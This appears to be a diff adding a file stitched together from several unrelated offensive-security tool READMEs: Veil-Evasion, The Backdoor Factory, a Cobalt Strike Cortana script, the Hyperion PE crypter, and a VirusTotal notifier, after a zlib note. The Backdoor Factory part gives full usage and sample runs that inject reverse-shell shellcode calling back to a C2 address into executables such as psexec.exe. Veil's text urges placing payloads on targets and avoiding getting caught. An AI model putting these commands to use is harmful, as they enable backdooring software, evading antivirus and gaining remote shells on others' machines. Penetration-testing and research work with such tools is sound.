@@ -1,0 +1,368 @@
+This directory contains an extract of zlib 1.2.3. It is the minimum set of
+files necessary to decompress data from a zip file with the inflate compression
+scheme.
+
+#Veil-Evasion
+
+Veil-Evasion is a tool designed to generate metasploit payloads that bypass common anti-virus solutions.
+
+NOTE: ./setup/setup.sh should be re-run on every major version update. If you receive any major errors on running Veil-Evasion, first try re-running this script to install any additional packages and update the common configuration file.
+
+
+Veil-Evasion is currently under active support by @ChrisTruncer, @TheMightyShiv, @HarmJ0y
+
+Thanks to:
+@jasonjfrank
+@mjmaley
+@davidpmcguire
+
+##Software Requirements:
+
+###Linux
+1.  Use Kali (x86) and all dependencies are pre-installed
+
+- or - 
+
+1.  Install Python 2.7
+2.  Install PyCrypto >= 2.3
+
+### Windows (for Py2Exe compilation)
+1.  Python (tested with x86 - http://www.python.org/download/releases/2.7/)
+2.  Py2Exe (http://sourceforge.net/projects/py2exe/files/py2exe/0.6.9/)
+3.  PyCrypto (http://www.voidspace.org.uk/python/modules.shtml)
+4.  PyWin32 (http://sourceforge.net/projects/pywin32/files/pywin32/Build%20218/pywin32-218.win32-py2.7.exe/download)
+
+##Setup (tldr;)
+
+Run ./setup.sh on Kali x86 (for Pyinstaller).
+Install Python 2.7, Py2Exe, PyCrypto, and PyWin32 on a Windows computer (for Py2Exe).  
+
+##Description
+Veil-Evasion was designed to run on Kali Linux, but should function on any system capable of executing python scripts.  Simply call Veil-Evasion from the command line, and follow the menu to generate a payload.  Upon creating the payload, Veil-Evasion will ask if you would like the payload file to be converted into an executable by Pyinstaller or Py2Exe.
+
+If using Pyinstaller, Veil-Evasion will convert your payload into an executable within Kali.
+
+If using Py2Exe, Veil-Evasion will create three files:
+
+* payload.py - The payload file
+* setup.py - Required file for Py2Exe
+* runme.bat - Batch script for compiling the payload into a Windows executable
+
+Move all three files onto your Windows machine with Python installed.  All three files should be placed in the root of the directory Python was installed to (likely C:\Python27).  Run the batch script to convert the Python script into an executable format.  
+
+Place the executable file on your target machine through any means necessary and don't get caught!
+
+##The Backdoor Factory
+For security professionals and researchers only.
+
+Many thanks to Ryan O'neill --ryan 'at' codeslum <d ot> org--
+Without him, I would still be trying to do stupid things 
+with the elf format.
+Also thanks to Silvio Cesare with his 1998 paper 
+(http://vxheaven.org/lib/vsc01.html) which these ELF patching
+techniques are based on.
+
+I learned a ton about the ELF format.  The first frustrating thing I noticed were the lack of code caves in debian builds.  However, you don't really need them. See the link above, circa 1998.  The look and feel to the user will be no different for ELF binaries, just point the tool at them as you have for PE bins.
+
+From DerbyCon: 
+    
+    Video: http://www.youtube.com/watch?v=jXLb2RNX5xs
+
+    Injection Module Demo: http://www.youtube.com/watch?v=04aJAex2o3U
+
+    Slides: http://www.slideshare.net/midnite_runr/patching-windows-executables-with-the-backdoor-factory
+
+Injects shellcode into win32/64 PE and linux32/64 ELF Files, to continue normal file execution (if the shellcode supports it), by patching the exe/dll directly.
+
+Some executables have built in protections, as such this will not work on all binaries.  It is advisable that you test target binaries before deploying them to clients or using them in exercises.
+
+Recently tested on all 32/64bit Sysinternal tools and Chrome browser.
+---
+
+Usage: ./backdoor.py -h
+
+Usage: backdoor.py [options]
+
+Options:
+  -h, --help            show this help message and exit
+  
+  -f FILE, --file=FILE  File to backdoor
+  
+  -s SHELL, --shell=SHELL
+                        Payloads that are available for use.
+  
+  -H HOST, --hostip=HOST
+                        IP of the C2 for reverse connections
+  
+  -P PORT, --port=PORT  The port to either connect back to for reverse shells
+                        or to listen on for bind shells
+  
+  -J, --cave_jumping    Select this options if you want to use code cave
+                        jumping to further hide your shellcode in the binary.
+  
+  -a, --add_new_section
+                        Mandating that a new section be added to the exe
+                        (better success) but less av avoidance
+  
+  -U SUPPLIED_SHELLCODE, --user_shellcode=SUPPLIED_SHELLCODE
+                        User supplied shellcode, make sure that it matches the
+                        architecture that you are targeting.
+  
+  -c, --cave            The cave flag will find code caves that can be used
+                        for stashing shellcode. This will print to all the
+                        code caves of a specific size.The -l flag can be use
+                        with this setting.
+  
+  -l SHELL_LEN, --shell_length=SHELL_LEN
+                        For use with -c to help find code caves of different
+                        sizes
+  
+  -o OUTPUT, --output-file=OUTPUT
+                        The backdoor output file
+  
+  -n NSECTION, --section=NSECTION
+                        New section name must be less than seven characters
+  
+  -d DIR, --directory=DIR
+                        This is the location of the files that you want to
+                        backdoor. You can make a directory of file backdooring
+                        faster by forcing the attaching of a codecave to the
+                        exe by using the -a setting.
+  
+  -w, --change_access   This flag changes the section that houses the codecave
+                        to RWE. Sometimes this is necessary. Enabled by
+                        default. If disabled, the backdoor may fail.
+  
+  -i, --injector        This command turns the backdoor factory in a hunt and
+                        shellcode inject type of mechinism. Edit the target
+                        settings in the injector module.
+  
+  -u SUFFIX, --suffix=SUFFIX
+                        For use with injector, places a suffix on the original
+                        file for easy recovery
+  
+  -D, --delete_original
+                        For use with injector module.  This command deletes
+                        the original file.  Not for use in production systems.
+                        *Author not responsible for stupid uses.*
+  
+  -O DISK_OFFSET, --disk_offset=DISK_OFFSET
+                        Starting point on disk offset, in bytes. Some authors
+                        want to obfuscate their on disk offset to avoid
+                        reverse engineering, if you find one of those files
+                        use this flag, after you find the offset.
+  
+  -S, --support_check   To determine if the file is supported by BDF prior to
+                        backdooring the file. For use by itself or with
+                        verbose. This check happens automatically if the
+                        backdooring is attempted.
+  
+  -q, --no_banner       Kills the banner.
+  
+  -v, --verbose         For debug information output.
+
+
+---
+
+Features:
+
+-After making a copy of the target file, the file copy will be patched directly.
+
+-Finding all codecaves in an EXE/DLL.
+
+-Injecting modified reverse/bind shells that allow continued execution after connection to the attacker.
+
+-Modifying the PE/COFF header to add an additional section for all win32 executables/dlls, including those with an import table.
+
+-Using the existing shellcode options, the ability to select PORT and HOST as connection options
+
+-The ability to backdoor a directory of executables/dlls
+
+---------------------------------------------
+
+Sample Usage:
+---
+
+###Backdoor a exe/dll using an existing code cave:
+
+./backdoor.py -f psexec.exe -H 192.168.0.100 -P 8080 -s reverse_shell_tcp 
+
+[*] In the backdoor module
+
+[*] Checking if binary is supported
+
+[*] Gathering file info
+
+[*] Reading win32 entry instructions
+
+[*] Looking for and setting selected shellcode
+
+[*] Creating win32 resume execution stub
+
+[*] Looking for caves that will fit the minimum shellcode length of 402
+
+[*] All caves lengths:  (402,)
+
+-############################################################
+
+The following caves can be used to inject code and possibly
+
+continue execution.
+
+**Don't like what you see? Use jump, single, or append.**
+
+-############################################################
+
+[*] Cave 1 length as int: 402
+
+[*] Available caves:
+
+1. Section Name: .data; Section Begin: 0x2d200 End: 0x2f200; Cave begin: 0x2d2d5 End: 0x2d4d0; Cave Size: 507
+
+2. Section Name: .data; Section Begin: 0x2d200 End: 0x2f200; Cave begin: 0x2d4e9 End: 0x2d6d5; Cave Size: 492
+
+3. Section Name: .data; Section Begin: 0x2d200 End: 0x2f200; Cave begin: 0x2d6e3 End: 0x2d8d8; Cave Size: 501
+
+4. Section Name: .data; Section Begin: 0x2d200 End: 0x2f200; Cave begin: 0x2d8f1 End: 0x2dadd; Cave Size: 492
+
+5. Section Name: .data; Section Begin: 0x2d200 End: 0x2f200; Cave begin: 0x2dae7 End: 0x2dce0; Cave Size: 505
+
+6. Section Name: .data; Section Begin: 0x2d200 End: 0x2f200; Cave begin: 0x2dcf3 End: 0x2dee5; Cave Size: 498
+
+7. Section Name: .data; Section Begin: 0x2d200 End: 0x2f200; Cave begin: 0x2defb End: 0x2e0ea; Cave Size: 495
+
+8. Section Name: .data; Section Begin: 0x2d200 End: 0x2f200; Cave begin: 0x2e161 End: 0x2e390; Cave Size: 559
+
+9. Section Name: .rsrc; Section Begin: 0x2f200 End: 0x5bc00; Cave begin: 0x58a39 End: 0x58c68; Cave Size: 559
+
+**************************************************
+
+[!] Enter your selection: 5
+
+Using selection: 5
+
+[*] Changing Section Flags
+
+[*] Patching initial entry instructions
+
+[*] Creating win32 resume execution stub
+
+[*] psexec.exe backdooring complete
+
+File psexec.exe is in the 'backdoored' directory
+
+---
+
+###Backdoor an exe/dll by adding a code section:
+
+./backdoor.py -f psexec.exe -H 192.168.0.100 -P 8080 -s reverse_shell_tcp -a 
+
+Adding a new section to the exe/dll for shellcode injection
+
+psexec.exe backdooring complete
+
+File bd.psexec.exe is in current directory
+
+---
+###Backdoor a directory of exes:
+./backdoor.py -d test/ -i 192.168.0.100 -p 8080 -s reverse_shell_tcp -a
+
+
+...output too long for README...
+
+---
+###Hunt and backdoor: Injector | Windows Only
+The injector module will look for target executables to backdoor on disk.  It will check to see if you have identified the target as a service, check to see if the process is running, kill the process and/or service, inject the executable with the shellcode, save the original file to either file.exe.old or another suffix of choice, and attempt to restart the process or service.  
+Edit the python dictionary "list_of_targets" in the 'injector' module for targets of your choosing.
+
+./backdoor.py -i -H 192.168.0.100 -P 8080 -s reverse_shell_tcp -a -u .moocowwow 
+
+This Cortana script integrates Veil-Evasion (https://github.com/Veil-Framework/Veil-Evasion)
+into Armitage/Cobalt Strike under 'Attacks' -> 'Veil-Evasion'
+
+It is part of a Cortana script from https://github.com/HarmJ0y/cortana.
+For a more complete Cortana repo, visit https://github.com/rsmudge/cortana-scripts
+
+
+On loading, the installation path for Veil-Evasion will be prompted for.
+
+Payloads can (optionally) be set to be substituted into PSEXEC calls on the fly.
+
+Existing Cobalt Strike listeners can be selected and appropriate options will
+be filled in.
+
+On generation, payload options are saved, even across restarts of Armitage/Cobalt Strike.
+
+
+Double-clicking 'Payload' will dynamically load the payloads available in
+the associated Veil-Evasion install.
+
+Double-clicking 'MSFPayload' will bring up a list of compatible
+metasploit shellcode specifications.
+
+Double-clicking LHOST will reset the LHOST variable to the local IP.
+
+
+-- harmj0y
+
+###############################################################################
+#                                                                             #
+#         ~    .__ °.__   0       o                    ^   .__ °__  `´        #
+#  °____) __ __|  | | °|   ______°____ 0 ____  __ _________|__|/  |_ ___.__.  #
+#  /    \|  | °\  |°|  | °/  ___// __ \_/ ___\|  | °\_  __ \ o\   __<   |  |  #
+# | o°|  \  |  /  |_|  |__\___ \\  ___/\ °\___| o|  /|  | \/  ||  |° \___ O|  #
+# |___|  /____/|____/____/____ °>\___  >\___  >____/ |__|° |__||__|  / ____|  #
+# `´´`´\/´`nullsecurity team`´\/`´´`´\/`´``´\/  ``´```´```´´´´`´``0_o\/´´`´´  #
+#                                                                             #
+# Hyperion: A runtime PE-Crypter                                              #
+#                                                                             #
+# VERSION                                                                     #
+# 1.0                                                                         #
+#                                                                             #
+# DATE                                                                        #
+# 25/05/2012                                                                  #
+#                                                                             #
+# AUTHOR                                                                      #
+# belial - http://www.nullsecurity.net/                                       #
+#                                                                             #
+# LICENSE                                                                     #
+# BSD-License                                                                 #
+#                                                                             #
+# DESCRIPTION                                                                 #
+# Hyperion is a runtime encrypter for 32-bit portable executables. It is a    #
+# reference implementation and bases on the paper "Hyperion: Implementation   #
+# of a PE-Crypter". The paper describes the implementation details which      #
+# aren't in the scope of this readme file.                                    #
+# The crypter is a C/C++ project and can be compiled with the corresponding   #
+# makefile (tested with Mingw and Visual Studio). Afterwards it is started    #
+# via the command line and encrypts an input executable with AES-128. The     #
+# encrypted file decrypts itself on startup (bruteforcing the AES key which   #
+# may take a few seconds) and generates a log file for debug purpose. The key #
+# space size can be changed in the crypter source code to speed up the brute  #
+# force key search algorithm.                                                 #
+#                                                                             #
+# TODO                                                                        #
+# - Late Binding of DLLs/APIs                                                 #
+# - AV evasion                                                                #
+# - Polymorphic generation of the container                                   #
+# - Add .NET Support                                                          #
+# - Change key space size via the command line                                #
+#                                                                             #
+# CHANGELOG:                                                                  #
+#                                                                             #
+# v1.0:                                                                       #
+# - initial release                                                           #
+#                                                                             #
+###############################################################################
+Virus Total Notifier
+=========
+
+This is a fork of Mubix's original VT-notifier script (https://github.com/mubix/vt-notify).
+
+Modifications from the original:
+
+	-Gmail gem utilization added in (gem install gmail)
+	-hash list can be hash:exename
+	-t 0 defaults to a single run
+
+
